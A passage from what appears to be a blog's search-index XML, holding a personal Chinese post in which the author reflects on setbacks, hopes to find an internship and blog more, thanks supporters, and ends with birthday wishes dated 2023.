alt="image-20220130142802861"></p></blockquote><p>希望明年可以找到一份实习工作，多多更新博客。</p><p>需要感谢的人太多，对我的好我都记得。</p><p>“我从不相信一帆风顺的说法，一帆风顺代表着你没有遇到任何困难，也就说你没有经历过打击，也就没有积累相对应的经验。学走路要经历摔跤，学骑自行车要经历摔跤，学滑雪要经历摔跤，你需要体验那种摔跤的痛感，你才能够在摔跤前做出相应的动作来让自己回归正轨。”</p><p>送给自己，谦卑一些。</p><blockquote><p>生日快乐~<br>一直在路上<br>加油！<br>读书太少，想的太多<br>date: 2023-01-20 00:00:00</p></blockquote>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
